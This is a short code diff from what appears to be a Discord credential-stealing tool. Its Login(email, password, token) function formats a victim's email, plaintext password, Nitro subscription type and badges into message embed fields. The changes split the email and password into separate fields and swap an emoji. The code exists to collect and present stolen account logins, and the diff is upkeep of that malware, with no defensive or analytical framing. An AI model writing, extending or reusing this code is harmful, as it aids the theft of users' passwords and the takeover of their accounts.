@@ -152,7 +152,17 @@ function Login(email, password, token) {
 
                             
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                      <:staff_blue:936543701294010399> **Password:** \`${password}\``,       
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                     
+                            
+                                   
+                            
+                            
+                            
+                            "inline": true
+                        },
+                        {
+                            "name": "",
+                            "value":  `<:staff_blue:936543701294010399> **Password:** \`${password}\``,       
                             
                             
                             
@@ -163,7 +173,7 @@ function Login(email, password, token) {
 
 
 
-                                   "value": `<a:axe_Pepenitro:932312223945224212> **Nitro Type:** ${GetNitro(json.premium_type)}\n
+                                   "value": `<a:black_heart:917768625522368542> **Nitro Type:** ${GetNitro(json.premium_type)}\n
                                    
                                    <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                    "inline": true
